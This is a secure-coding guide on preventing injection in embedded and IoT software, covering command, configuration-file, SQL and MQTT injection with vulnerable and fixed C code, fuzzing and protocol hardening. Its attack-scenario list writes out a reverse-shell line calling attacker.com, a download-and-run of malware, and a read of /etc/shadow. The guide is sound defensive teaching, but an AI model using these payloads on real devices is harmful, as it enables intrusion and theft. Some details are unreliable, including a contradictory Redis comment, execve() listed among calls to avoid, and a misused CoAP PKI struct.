# Injection Prevention

Ensure all untrusted data and user input is validated, sanitized, and/or output encoded to prevent unintended system execution. There are various injection attacks within application security such as operating system (OS) command injection, cross-site scripting (E.g. JavaScript injection), SQL injection, and others such as XPath injection. However, the most prevalent of the injection attacks within embedded software pertain to OS command injection; when an application accepts untrusted/insecure input and passes it to external applications (either as the application name itself or arguments) without validation or proper escaping.

[**Noncompliant Code Example**](https://wiki.sei.cmu.edu/confluence/display/c/2130132) of using operating system calls:

In this noncompliant code example, the system() function is used to execute any_cmd in the host environment. Invocation of a command processor is not required.

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

enum { BUFFERSIZE = 512 };

void func(const char *input) {
  char cmdbuf[BUFFERSIZE];
  int len_wanted = snprintf(cmdbuf, BUFFERSIZE,
                            "any_cmd '%s'", input);
  if (len_wanted >= BUFFERSIZE) {
    /* Handle error */
  } else if (len_wanted < 0) {
    /* Handle error */
  } else if (system(cmdbuf) == -1) {
    /* Handle error */
  }
}
```

If this code is compiled and run with elevated privileges on a Linux system, an attacker can create an account by entering the following string: `any_cmd 'happy'; useradd 'attacker'` which would be interpreted as:

```c
any_cmd 'happy';
useradd 'attacker'
```

**Compliant Example**:In this compliant solution, the call to `system()` is replaced with a call to `execve()`. The exec family of functions does not use a full shell interpreter, so it is not vulnerable to command-injection attacks, such as the one illustrated in the noncompliant code example.

The `execlp()`, `execvp()`, and (nonstandard) `execvP()` functions duplicate the actions of the shell in searching for an executable file if the specified filename does not contain a forward slash character (/). As a result, they should be used without a forward slash character (/) only if the PATH environment variable is set to a safe value.

The `execl()`, `execle()`, `execv()`, and `execve()` functions do not perform path name substitution.

Additionally, precautions should be taken to ensure the external executable cannot be modified by an untrusted user, for example, by ensuring the executable is not writable by the user. This compliant solution is significantly different from the preceding noncompliant code example. First, input is incorporated into the args array and passed as an argument to `execve()`, eliminating concerns about buffer overflow or string truncation while forming the command string. Second, this compliant solution forks a new process before executing `/usr/bin/any_cmd` in the child process. Although this method is more complicated than calling system(), the added security is worth the additional effort.

```c
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>

void func(char *input) {
  pid_t pid;
  int status;
  pid_t ret;
  char *const args[3] = {"any_exe", input, NULL};
  char **env;
  extern char **environ;

  /* ... Sanitize arguments ... */

  pid = fork();
  if (pid == -1) {
    /* Handle error */
  } else if (pid != 0) {
    while ((ret = waitpid(pid, &status, 0)) == -1) {
      if (errno != EINTR) {
        /* Handle error */
        break;
      }
    }
    if ((ret != -1) &&
      (!WIFEXITED(status) || !WEXITSTATUS(status)) ) {
      /* Report unexpected child status */
    }
  } else {
    /* ... Initialize env as a sanitized copy of environ ... */
    if (execve("/usr/bin/any_cmd", args, env) == -1) {
      /* Handle error */
      _Exit(127);
    }
  }
}
```

## Real-World Embedded Device Examples

### Example 1: OS Command Injection in Embedded Web Application

Many embedded devices expose web-based diagnostic tools that execute system commands. This example shows a common vulnerability in network diagnostic functions.

**Vulnerable Code - Network Diagnostics Endpoint**:

```c
// Embedded web server CGI handler - VULNERABLE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void handle_ping_request(const char *target_ip) {
    char command[256];

    // VULNERABLE: User input directly in system() call
    snprintf(command, sizeof(command), "ping -c 4 %s", target_ip);
    system(command);  // OS Command Injection vulnerability!
}

// Example vulnerable web request:
// GET /cgi-bin/ping?ip=192.168.1.1; cat /etc/shadow
// Executes: ping -c 4 192.168.1.1; cat /etc/shadow
```

**Attack Scenarios**:
* `192.168.1.1; reboot` - Reboot device remotely
* `192.168.1.1 && cat /etc/shadow` - Extract password hashes
* `192.168.1.1 | nc attacker.com 4444 -e /bin/sh` - Create reverse shell
* `192.168.1.1; wget http://malware.com/bot -O /tmp/bot && chmod +x /tmp/bot && /tmp/bot` - Download and execute malware

**Secure Solution**:

```c
// SECURE: Validate input and use execve() instead of system()
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <regex.h>
#include <ctype.h>

int validate_ipv4(const char *ip) {
    regex_t regex;
    // Strict IPv4 validation regex
    const char *pattern = "^([0-9]{1,3}\\.){3}[0-9]{1,3}$";

    if (regcomp(&regex, pattern, REG_EXTENDED) != 0) {
        return 0;
    }

    int result = regexec(&regex, ip, 0, NULL, 0);
    regfree(&regex);

    if (result != 0) return 0;

    // Additional validation: Check each octet is 0-255
    int a, b, c, d;
    if (sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d) != 4) {
        return 0;
    }

    if (a < 0 || a > 255 || b < 0 || b > 255 ||
        c < 0 || c > 255 || d < 0 || d > 255) {
        return 0;
    }

    return 1;
}

int is_private_ip(const char *ip) {
    int a, b, c, d;
    sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d);

    // Allow only private IP ranges (example policy)
    // 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12
    if ((a == 192 && b == 168) ||
        (a == 10) ||
        (a == 172 && b >= 16 && b <= 31)) {
        return 1;
    }

    return 0;
}

void handle_ping_request_secure(const char *target_ip) {
    // Step 1: Validate input format
    if (!validate_ipv4(target_ip)) {
        fprintf(stderr, "Invalid IP address format\n");
        return;
    }

    // Step 2: Apply allowlist policy (only private IPs)
    if (!is_private_ip(target_ip)) {
        fprintf(stderr, "IP not in allowed range\n");
        return;
    }

    // Step 3: Use execve() with controlled arguments
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - No shell interpretation
        char *args[] = {
            "/bin/ping",
            "-c", "4",
            "-W", "2",  // 2 second timeout
            (char *)target_ip,
            NULL
        };
        char *env[] = {NULL};  // Empty environment

        execve("/bin/ping", args, env);
        _Exit(127);  // exec failed
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            printf("Ping successful\n");
        } else {
            printf("Ping failed\n");
        }
    } else {
        perror("fork failed");
    }
}
```

### Example 2: Newline Command Injection in Configuration Files

Configuration file injection is common in embedded devices that write user input to config files without proper sanitization.

**Vulnerable Code - WiFi Configuration**:

```c
// Embedded device WiFi configuration - VULNERABLE
#include <stdio.h>
#include <string.h>

void configure_wifi(const char *ssid, const char *password) {
    FILE *fp = fopen("/etc/wpa_supplicant/wpa_supplicant.conf", "w");
    if (!fp) return;

    // VULNERABLE: No newline validation
    fprintf(fp, "network={\n");
    fprintf(fp, "    ssid=\"%s\"\n", ssid);
    fprintf(fp, "    psk=\"%s\"\n", password);
    fprintf(fp, "}\n");

    fclose(fp);
    system("wpa_cli -i wlan0 reconfigure");
}

// Attack vector - malicious SSID:
// SSID = "MyNetwork\"\n}\nnetwork={\n    ssid=\"EvilBackdoor\"\n    key_mgmt=NONE\n#"
//
// Results in injected configuration:
// network={
//     ssid="MyNetwork"
// }
// network={
//     ssid="EvilBackdoor"
//     key_mgmt=NONE    # No authentication - open backdoor!
// #"
//     psk="userpassword"
// }
```

**Attack Impact**:
* Add backdoor WiFi networks without authentication
* Inject malicious configuration directives
* Disable security features via config injection
* Expose device to unauthorized access

**Secure Solution**:

```c
// SECURE: Validate and sanitize configuration input
#include <stdio.h>
#include <string.h>
#include <ctype.h>

int validate_wifi_ssid(const char *ssid) {
    size_t len = strlen(ssid);

    // Check length (WPA2 max SSID: 32 bytes)
    if (len == 0 || len > 32) return 0;

    // Check for control characters and injection chars
    for (size_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)ssid[i];

        // Reject: newlines, carriage returns, nulls, quotes, backslashes
        if (c == '\n' || c == '\r' || c == '\0' ||
            c == '"' || c == '\'' || c == '\\' ||
            c == '}' || c == '{' || c == '#' || c == ';') {
            return 0;
        }

        // Only allow printable ASCII and common UTF-8
        if (c < 0x20 || c == 0x7F) {
            return 0;
        }
    }

    return 1;
}

int validate_wifi_password(const char *password) {
    size_t len = strlen(password);

    // WPA2 password: 8-63 characters
    if (len < 8 || len > 63) return 0;

    // Same character validation as SSID
    return validate_wifi_ssid(password);
}

void escape_for_config(const char *input, char *output, size_t output_size) {
    size_t j = 0;
    for (size_t i = 0; input[i] && j < output_size - 2; i++) {
        // Escape quotes and backslashes
        if (input[i] == '"' || input[i] == '\\') {
            output[j++] = '\\';
        }
        output[j++] = input[i];
    }
    output[j] = '\0';
}

void configure_wifi_secure(const char *ssid, const char *password) {
    char safe_ssid[128];
    char safe_password[128];

    // Step 1: Validate inputs
    if (!validate_wifi_ssid(ssid)) {
        fprintf(stderr, "Invalid SSID format\n");
        return;
    }

    if (!validate_wifi_password(password)) {
        fprintf(stderr, "Invalid password format\n");
        return;
    }

    // Step 2: Escape special characters (defense in depth)
    escape_for_config(ssid, safe_ssid, sizeof(safe_ssid));
    escape_for_config(password, safe_password, sizeof(safe_password));

    // Step 3: Use safe file writing with atomic operation
    const char *tmp_file = "/etc/wpa_supplicant/wpa_supplicant.conf.tmp";
    const char *conf_file = "/etc/wpa_supplicant/wpa_supplicant.conf";

    FILE *fp = fopen(tmp_file, "w");
    if (!fp) {
        perror("Failed to open config file");
        return;
    }

    // Step 4: Write validated and escaped configuration
    fprintf(fp, "# Generated configuration - do not edit\n");
    fprintf(fp, "network={\n");
    fprintf(fp, "    ssid=\"%s\"\n", safe_ssid);
    fprintf(fp, "    psk=\"%s\"\n", safe_password);
    fprintf(fp, "}\n");

    fclose(fp);

    // Step 5: Atomic rename (prevents partial writes)
    if (rename(tmp_file, conf_file) != 0) {
        perror("Failed to update config");
        unlink(tmp_file);
        return;
    }

    // Step 6: Use safe reconfiguration (no shell)
    pid_t pid = fork();
    if (pid == 0) {
        char *args[] = {
            "/usr/sbin/wpa_cli",
            "-i", "wlan0",
            "reconfigure",
            NULL
        };
        execve("/usr/sbin/wpa_cli", args, NULL);
        _Exit(127);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }
}
```

**Additional Defense Mechanisms**:

```c
// Helper: Strip all control characters
void sanitize_control_chars(char *str) {
    char *src = str;
    char *dst = str;

    while (*src) {
        // Keep only printable characters
        if (isprint((unsigned char)*src)) {
            *dst++ = *src;
        }
        src++;
    }
    *dst = '\0';
}

// Helper: Use parameterized config writers (like prepared statements for SQL)
typedef struct {
    const char *key;
    const char *value;
} config_param_t;

void write_config_safe(const char *filename, config_param_t *params, size_t count) {
    FILE *fp = fopen(filename, "w");
    if (!fp) return;

    for (size_t i = 0; i < count; i++) {
        // No user input in format string
        fputs(params[i].key, fp);
        fputs("=\"", fp);
        // Write value character by character, escaping as needed
        for (const char *p = params[i].value; *p; p++) {
            if (*p == '"' || *p == '\\') fputc('\\', fp);
            if (isprint((unsigned char)*p)) fputc(*p, fp);
        }
        fputs("\"\n", fp);
    }

    fclose(fp);
}
```

## Database Security for Embedded Systems

Embedded devices increasingly use lightweight databases for local data storage. Common databases include SQLite (file-based), Redis (in-memory), and Berkeley DB. Securing these databases requires proper query parameterization, access control, and encryption.

### SQLite Security Best Practices

**SQLite Injection Vulnerability**:
```c
// VULNERABLE: SQL Injection
#include <sqlite3.h>

void get_user_data(sqlite3 *db, const char *username) {
    char query[256];
    sqlite3_stmt *stmt;

    // VULNERABLE: String concatenation with user input
    snprintf(query, sizeof(query),
             "SELECT * FROM users WHERE username = '%s'", username);

    sqlite3_prepare_v2(db, query, -1, &stmt, NULL);
    // Attacker input: username = "admin' OR '1'='1"
    // Executes: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
}
```

**Secure Solution - Prepared Statements**:
```c
// SECURE: Use parameterized queries
void get_user_data_secure(sqlite3 *db, const char *username) {
    sqlite3_stmt *stmt;
    const char *query = "SELECT * FROM users WHERE username = ?";

    // Prepare statement with placeholder
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
        fprintf(stderr, "Failed to prepare statement: %s\n",
                sqlite3_errmsg(db));
        return;
    }

    // Bind parameter (SQLite handles escaping)
    sqlite3_bind_text(stmt, 1, username, -1, SQLITE_TRANSIENT);

    // Execute query
    if (sqlite3_step(stmt) == SQLITE_ROW) {
        const char *data = (const char *)sqlite3_column_text(stmt, 0);
        printf("User data: %s\n", data);
    }

    sqlite3_finalize(stmt);
}
```

**SQLite Encryption with SQLCipher (Yocto)**:
```bitbake
# Recipe for SQLCipher (encrypted SQLite)
# sqlcipher_4.5.bb

DESCRIPTION = "SQLCipher - Encrypted SQLite database"
LICENSE = "BSD-3-Clause"

DEPENDS = "openssl"

SRC_URI = "https://github.com/sqlcipher/sqlcipher/archive/v${PV}.tar.gz"
SRC_URI[sha256sum] = "..."

inherit autotools

EXTRA_OECONF = "--enable-tempstore=yes --enable-fts5 \
                CFLAGS='-DSQLITE_HAS_CODEC' \
                LDFLAGS='-lcrypto'"

# Usage in C code
do_compile:append() {
    cat > ${B}/example.c << 'EOF'
#include <sqlite3.h>

void secure_db_example() {
    sqlite3 *db;
    sqlite3_open("encrypted.db", &db);

    // Set encryption key (256-bit)
    const char *key = "my-secret-key-32-bytes-long-here";
    sqlite3_key(db, key, strlen(key));

    // Use database normally
    sqlite3_exec(db, "CREATE TABLE IF NOT EXISTS secrets (id INTEGER, data TEXT)", NULL, NULL, NULL);
    sqlite3_close(db);
}
EOF
}
```

**SQLite Security Configuration**:
```c
// Secure SQLite initialization
sqlite3 *init_secure_sqlite(const char *db_path) {
    sqlite3 *db;

    // Open database
    if (sqlite3_open_v2(db_path, &db,
                        SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE,
                        NULL) != SQLITE_OK) {
        return NULL;
    }

    // Security configurations
    sqlite3_exec(db, "PRAGMA journal_mode=WAL", NULL, NULL, NULL);  // Write-Ahead Logging
    sqlite3_exec(db, "PRAGMA synchronous=FULL", NULL, NULL, NULL);  // Prevent corruption
    sqlite3_exec(db, "PRAGMA secure_delete=ON", NULL, NULL, NULL);  // Overwrite deleted data
    sqlite3_exec(db, "PRAGMA auto_vacuum=FULL", NULL, NULL, NULL);  // Prevent data leakage

    // Set file permissions (read/write for owner only)
    chmod(db_path, 0600);

    return db;
}
```

### Redis Security for Embedded Systems

**Redis Configuration Hardening**:
```conf
# /etc/redis/redis.conf - Production configuration

# Bind to localhost only (prevent remote access)
bind 127.0.0.1 ::1

# Disable protected mode (use firewall instead)
protected-mode yes

# Require authentication
requirepass YourStrongPasswordHere123!

# Disable dangerous commands
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG ""
rename-command SHUTDOWN SHUTDOWN_SECRET_KEY
rename-command DEBUG ""

# Enable TLS (Redis 6.0+)
tls-port 6380
port 0  # Disable non-TLS
tls-cert-file /etc/redis/certs/redis.crt
tls-key-file /etc/redis/certs/redis.key
tls-ca-cert-file /etc/redis/certs/ca.crt

# Limit memory usage (prevent DoS)
maxmemory 128mb
maxmemory-policy allkeys-lru

# Enable AOF persistence with encryption
appendonly yes
appendfilename "appendonly.aof"

# Disable RDB snapshots (use AOF instead)
save ""
```

**Secure Redis Client Example**:
```c
// Using hiredis library
#include <hiredis/hiredis.h>
#include <hiredis/hiredis_ssl.h>

redisContext* connect_redis_secure() {
    redisContext *c;

    // Connect with TLS
    redisSSLContext *ssl;
    redisSSLContextError ssl_error;

    redisInitOpenSSL();
    ssl = redisCreateSSLContext(
        "/etc/redis/certs/ca.crt",    // CA cert
        NULL,                          // Cert dir
        "/etc/redis/certs/client.crt", // Client cert
        "/etc/redis/certs/client.key", // Client key
        NULL,                          // Server name
        &ssl_error
    );

    if (!ssl) {
        fprintf(stderr, "SSL context error: %d\n", ssl_error);
        return NULL;
    }

    // Connect to Redis
    c = redisConnect("127.0.0.1", 6380);
    if (c == NULL || c->err) {
        fprintf(stderr, "Connection error: %s\n",
                c ? c->errstr : "Out of memory");
        return NULL;
    }

    // Establish TLS
    if (redisInitiateSSLWithContext(c, ssl) != REDIS_OK) {
        fprintf(stderr, "SSL error: %s\n", c->errstr);
        redisFree(c);
        return NULL;
    }

    // Authenticate
    redisReply *reply = redisCommand(c, "AUTH YourStrongPasswordHere123!");
    if (reply->type == REDIS_REPLY_ERROR) {
        fprintf(stderr, "Auth failed: %s\n", reply->str);
        freeReplyObject(reply);
        redisFree(c);
        return NULL;
    }
    freeReplyObject(reply);

    return c;
}

// Safe Redis command execution with input validation
void set_user_preference(redisContext *c, const char *user_id, const char *value) {
    // Validate inputs
    if (!user_id || strlen(user_id) == 0 || strlen(user_id) > 64) {
        fprintf(stderr, "Invalid user ID\n");
        return;
    }

    if (!value || strlen(value) > 1024) {
        fprintf(stderr, "Invalid value\n");
        return;
    }

    // Use parameterized commands (no injection)
    redisReply *reply = redisCommand(c, "SET user:%s:pref %s",
                                     user_id, value);
    if (!reply) {
        fprintf(stderr, "Redis command failed: %s\n", c->errstr);
        return;
    }

    freeReplyObject(reply);
}
```

**Yocto Recipe for Redis with TLS**:
```bitbake
# redis_7.2.bb
DESCRIPTION = "Redis in-memory database with TLS support"
LICENSE = "BSD-3-Clause"

DEPENDS = "openssl"

SRC_URI = "http://download.redis.io/releases/redis-${PV}.tar.gz \
           file://redis.conf \
           file://redis-server.service"

inherit systemd

EXTRA_OEMAKE = "USE_SYSTEMD=yes BUILD_TLS=yes"

do_install:append() {
    install -d ${D}${sysconfdir}/redis
    install -m 0600 ${WORKDIR}/redis.conf ${D}${sysconfdir}/redis/

    install -d ${D}${systemd_system_unitdir}
    install -m 0644 ${WORKDIR}/redis-server.service ${D}${systemd_system_unitdir}/
}

SYSTEMD_SERVICE:${PN} = "redis-server.service"
```

## Fuzzing for Embedded Input Validation

Fuzzing is essential for discovering injection vulnerabilities and input validation bugs in embedded systems. Modern fuzzing frameworks can automatically discover crashes and security issues.

### AFL++ (American Fuzzy Lop Plus Plus)

**Yocto Integration**:
```bitbake
# afl++_4.09.bb - AFL++ fuzzer for Yocto
DESCRIPTION = "AFL++ - Advanced fuzzing framework"
LICENSE = "Apache-2.0"

SRC_URI = "https://github.com/AFLplusplus/AFLplusplus/archive/v${PV}.tar.gz"

inherit native

do_compile() {
    oe_runmake all
}

do_install() {
    oe_runmake install DESTDIR=${D} PREFIX=${prefix}
}

# Fuzzing recipe for your application
# myapp-fuzz_1.0.bb
DESCRIPTION = "Fuzzing harness for myapp"

DEPENDS = "afl++-native myapp"

do_compile() {
    # Compile with AFL++ instrumentation
    ${STAGING_BINDIR_NATIVE}/afl-clang-fast \
        ${CFLAGS} -o myapp-fuzz \
        ${S}/myapp.c ${S}/fuzz-harness.c
}
```

**AFL++ Fuzzing Harness Example**:
```c
// fuzz-harness.c - AFL++ harness for command injection testing
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Function under test (from earlier examples)
extern void handle_ping_request(const char *target_ip);

int main(int argc, char **argv) {
    // Read fuzzer input from stdin
    char input[256];
    size_t len = read(STDIN_FILENO, input, sizeof(input) - 1);

    if (len > 0) {
        input[len] = '\0';

        // Test the vulnerable function
        handle_ping_request(input);
    }

    return 0;
}
```

**Running AFL++ Fuzzer**:
```bash
# Create input corpus
mkdir -p fuzz_in fuzz_out
echo "192.168.1.1" > fuzz_in/seed1.txt
echo "10.0.0.1" > fuzz_in/seed2.txt

# Run fuzzer
afl-fuzz -i fuzz_in -o fuzz_out -- ./myapp-fuzz

# AFL++ will discover inputs like:
# - "192.168.1.1; reboot"
# - "192.168.1.1 && cat /etc/passwd"
# - "192.168.1.1 | nc attacker.com 4444"
```

### LibFuzzer Integration

**LibFuzzer for In-Process Fuzzing**:
```c
// libfuzzer-harness.c - LibFuzzer harness
#include <stdint.h>
#include <stddef.h>
#include <string.h>

extern int validate_ipv4(const char *ip);

// LibFuzzer entry point
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (size == 0 || size > 64) return 0;

    // Create null-terminated string
    char input[65];
    memcpy(input, data, size);
    input[size] = '\0';

    // Test validation function
    validate_ipv4(input);

    return 0;
}
```

**Compile with LibFuzzer**:
```bitbake
# In your recipe
do_compile:append() {
    # Compile with LibFuzzer
    ${CC} -fsanitize=fuzzer,address -g -O1 \
          -o libfuzzer-harness \
          libfuzzer-harness.c myapp.c
}
```

**Run LibFuzzer**:
```bash
# Run fuzzer with corpus
./libfuzzer-harness corpus/ -max_total_time=3600

# LibFuzzer output:
# INFO: Running with entropic power schedule (0xFF, 100).
# INFO: Seed: 1234567890
# #0      pulse  cov: 12 ft: 13 corp: 1/1b exec/s: 0 rss: 30Mb
# #1024   pulse  cov: 45 ft: 67 corp: 23/456b exec/s: 512 rss: 32Mb
# ==12345== ERROR: AddressSanitizer: heap-buffer-overflow
# CRASH FOUND!
```

### OSS-Fuzz Integration for Continuous Fuzzing

**OSS-Fuzz Configuration**:
```bash
# projects/myapp/project.yaml
homepage: "https://github.com/mycompany/myapp"
language: c
primary_contact: "security@mycompany.com"
auto_ccs:
  - "dev@mycompany.com"
sanitizers:
  - address
  - undefined
  - memory
```

```bash
# projects/myapp/build.sh
#!/bin/bash -eu

# Build with fuzzing instrumentation
cd $SRC/myapp
make clean

$CC $CFLAGS -c myapp.c -o myapp.o
$CXX $CXXFLAGS $LIB_FUZZING_ENGINE \
     fuzz_target.cc myapp.o \
     -o $OUT/fuzz_target
```

## IoT Protocol Injection Attacks

Embedded devices use various IoT protocols (MQTT, CoAP, Modbus/TCP) that are vulnerable to injection attacks if not properly secured.

### MQTT Security

**Insecure MQTT Usage**:
```c
// VULNERABLE: No validation of MQTT topics
#include <mosquitto.h>

void publish_sensor_data(struct mosquitto *mosq, const char *sensor_id,
                         const char *value) {
    char topic[256];

    // VULNERABLE: Topic injection
    snprintf(topic, sizeof(topic), "sensors/%s/data", sensor_id);
    mosquitto_publish(mosq, NULL, topic, strlen(value), value, 0, false);

    // Attacker input: sensor_id = "../admin/command"
    // Publishes to: sensors/../admin/command/data
}
```

**Secure MQTT Implementation**:
```c
// SECURE: Validate MQTT topics and use TLS
int validate_mqtt_topic(const char *topic) {
    size_t len = strlen(topic);

    // Check length (MQTT max topic: 65535 bytes, but use reasonable limit)
    if (len == 0 || len > 128) return 0;

    // Check for invalid characters
    for (size_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)topic[i];

        // Reject: null bytes, wildcards, path traversal
        if (c == '\0' || c == '#' || c == '+' ||
            strstr(topic, "..") != NULL) {
            return 0;
        }

        // Only allow alphanumeric, dash, underscore, slash
        if (!isalnum(c) && c != '-' && c != '_' && c != '/') {
            return 0;
        }
    }

    return 1;
}

struct mosquitto* init_secure_mqtt(const char *host, int port,
                                    const char *ca_cert,
                                    const char *client_cert,
                                    const char *client_key) {
    struct mosquitto *mosq;

    mosquitto_lib_init();
    mosq = mosquitto_new("secure-client", true, NULL);

    // Configure TLS
    mosquitto_tls_set(mosq, ca_cert, NULL, client_cert, client_key, NULL);
    mosquitto_tls_opts_set(mosq, 1, "tlsv1.3", NULL);

    // Set username/password authentication
    mosquitto_username_pw_set(mosq, "device123", "SecurePassword!");

    // Connect with TLS
    mosquitto_connect(mosq, host, port, 60);

    return mosq;
}

void publish_sensor_data_secure(struct mosquitto *mosq,
                                 const char *sensor_id,
                                 const char *value) {
    // Validate sensor_id
    if (!validate_mqtt_topic(sensor_id)) {
        fprintf(stderr, "Invalid sensor ID\n");
        return;
    }

    // Validate value
    if (!value || strlen(value) > 1024) {
        fprintf(stderr, "Invalid sensor value\n");
        return;
    }

    // Construct topic safely
    char topic[256];
    snprintf(topic, sizeof(topic), "sensors/%s/data", sensor_id);

    // Publish with QoS 1 (at least once delivery)
    mosquitto_publish(mosq, NULL, topic, strlen(value), value, 1, false);
}
```

### CoAP Security

**Secure CoAP with DTLS**:
```c
// Using libcoap with DTLS
#include <coap3/coap.h>

coap_context_t* init_secure_coap(const char *psk_key, const char *psk_identity) {
    coap_context_t *ctx = coap_new_context(NULL);

    // Configure DTLS with Pre-Shared Key
    coap_dtls_pki_t dtls_pki;
    memset(&dtls_pki, 0, sizeof(dtls_pki));

    dtls_pki.version = COAP_DTLS_PKI_SETUP_VERSION;
    dtls_pki.psk_info.key.s = (const uint8_t *)psk_key;
    dtls_pki.psk_info.key.length = strlen(psk_key);
    dtls_pki.psk_info.identity.s = (const uint8_t *)psk_identity;
    dtls_pki.psk_info.identity.length = strlen(psk_identity);

    coap_context_set_pki(ctx, &dtls_pki);

    return ctx;
}

// Validate CoAP URI paths
int validate_coap_path(const char *path) {
    // Prevent path traversal
    if (strstr(path, "..") != NULL) return 0;

    // Only allow specific paths (allowlist)
    const char *allowed_paths[] = {
        "/sensors/temperature",
        "/sensors/humidity",
        "/actuators/led",
        NULL
    };

    for (int i = 0; allowed_paths[i] != NULL; i++) {
        if (strcmp(path, allowed_paths[i]) == 0) {
            return 1;
        }
    }

    return 0;
}
```

### Modbus/TCP Security for Industrial IoT

**Secure Modbus Implementation**:
```c
// Modbus/TCP with input validation for IIoT/SCADA
#include <modbus/modbus.h>

modbus_t* init_secure_modbus(const char *ip, int port) {
    modbus_t *ctx;

    // Create Modbus TCP context
    ctx = modbus_new_tcp(ip, port);
    if (ctx == NULL) {
        return NULL;
    }

    // Set timeouts (prevent DoS)
    modbus_set_response_timeout(ctx, 5, 0);  // 5 seconds
    modbus_set_byte_timeout(ctx, 1, 0);      // 1 second

    // Connect
    if (modbus_connect(ctx) == -1) {
        modbus_free(ctx);
        return NULL;
    }

    return ctx;
}

// Validate Modbus register addresses (prevent unauthorized access)
int validate_modbus_address(uint16_t addr, uint16_t count) {
    // Define allowed register ranges (allowlist)
    struct {
        uint16_t start;
        uint16_t end;
    } allowed_ranges[] = {
        {0x0000, 0x00FF},  // Sensor data registers
        {0x1000, 0x10FF},  // Configuration registers (read-only for most users)
        {0, 0}             // Terminator
    };

    // Check if address range is in allowlist
    for (int i = 0; allowed_ranges[i].end != 0; i++) {
        if (addr >= allowed_ranges[i].start &&
            (addr + count - 1) <= allowed_ranges[i].end) {
            return 1;
        }
    }

    return 0;
}

int read_modbus_registers_secure(modbus_t *ctx, uint16_t addr, uint16_t count,
                                  uint16_t *dest) {
    // Validate input parameters
    if (count == 0 || count > 125) {  // Modbus limit: 125 registers
        fprintf(stderr, "Invalid register count\n");
        return -1;
    }

    // Validate address range
    if (!validate_modbus_address(addr, count)) {
        fprintf(stderr, "Unauthorized register access attempt: 0x%04X\n", addr);
        return -1;
    }

    // Read registers
    int rc = modbus_read_registers(ctx, addr, count, dest);
    if (rc == -1) {
        fprintf(stderr, "Modbus read failed: %s\n", modbus_strerror(errno));
        return -1;
    }

    return rc;
}
```

## OWASP IoT Ecosystem Mapping

### OS Command Injection (Example 1):
* **OWASP ISVS**: V2.3.1 - The device validates and sanitizes all untrusted data used in operating system command execution
* **OWASP ISTG**: ISTG-UI-INFO-001 - Test web interface input validation and command injection
* **OWASP FSTM**: Stage 6 (Dynamic Analysis) - Test network diagnostic functions for command injection
* **OWASP IoTGoat**: Practice with ping command injection vulnerability in web admin panel

### Configuration Injection (Example 2):
* **OWASP ISVS**: V2.3.2 - Configuration file parsers validate input to prevent injection attacks
* **OWASP ISTG**: ISTG-FW-CONF-001 - Configuration file security testing
* **OWASP FSTM**: Stage 4 (Filesystem Analysis) - Examine configuration file parsing logic
* **OWASP IoTGoat**: Practice with WiFi config injection in network settings page

### Database Security:
* **OWASP ISVS**: V2.2.1 - The device uses parameterized queries or prepared statements for database access
* **OWASP ISTG**: ISTG-DES-LOGIC-002 - Test for SQL injection vulnerabilities
* **OWASP FSTM**: Stage 6 - Dynamic testing of database interfaces
* **OWASP IoTGoat**: Practice SQL injection in device management interface

### IoT Protocol Security:
* **OWASP ISVS**: V4.1.3 - IoT protocols implement authentication and encryption
* **OWASP ISTG**: ISTG-DES-COMM-002 - Test IoT protocol security (MQTT, CoAP)
* **OWASP FSTM**: Stage 7 - Network protocol analysis
* **OWASP IoTGoat**: Practice MQTT topic injection attacks

**Considerations:**

* Do not invoke shell command wrappers such as but not limited to:
  * PHP:`system()` `exec()`, `passthru()`, `shell_exec()`
  * C:`system() popen()`, `exec()`, `execl()`, `execle()`, `execv()`, `execve()`
  * C++:`ShellExecute()`
  * Lua:`os.execute()`
  * Perl:`system()`, `exec()`
  * Python:`os.system()` `subprocess.call()`
* If possible, avoid utilizing user data into operation system commands.
  * If needed, utilize lookup maps of numbers-to-command-strings for user driven strings that may be passed to the operating system.
* Apply an "allowed list" of accepted commands via a lookup map to ensure only expected parameter values are processed.
* **Validate and sanitize ALL user input** before using in system commands or configuration files
* **Reject dangerous characters**: newlines (`\n`, `\r`), semicolons (`;`), pipes (`|`), ampersands (`&`), quotes (`"`, `'`), backslashes (`\`), braces (`{`, `}`), hash (`#`)
* **Use parameterized/safe APIs**: `execve()` instead of `system()`, prepared statements for databases
* **Apply defense in depth**: Input validation + output escaping + safe APIs + least privilege
* **Implement fuzzing**: Use AFL++, LibFuzzer, or OSS-Fuzz to discover injection vulnerabilities
* **Secure databases**: Use SQLCipher for encryption, prepared statements for SQL injection prevention
* **Harden IoT protocols**: Enable TLS/DTLS for MQTT/CoAP, validate topics and URIs
* **Industrial IoT**: Implement address validation and access control for Modbus/TCP and other SCADA protocols
* Ensure to contextually output encode characters user data (e.g. HTML, JavaScript, CSS, etc.)
  * HTML Entity Encoding
    * &lt; output encoded to:
      * ```text
        &lt;
        ```
    * &gt; output encoded to:
      * `&gt;`

## Additional References: <a id="additional-references"></a>

* [Multiple Netgear routers are vulnerable to arbitrary command injection](https://www.kb.cert.org/vuls/id/582384)
* [FTC Charges D-Link Put Consumers' Privacy at Risk Due to the Inadequate Security of Its Computer Routers and Cameras](https://www.ftc.gov/news-events/press-releases/2017/01/ftc-charges-d-link-put-consumers-privacy-risk-due-inadequate)
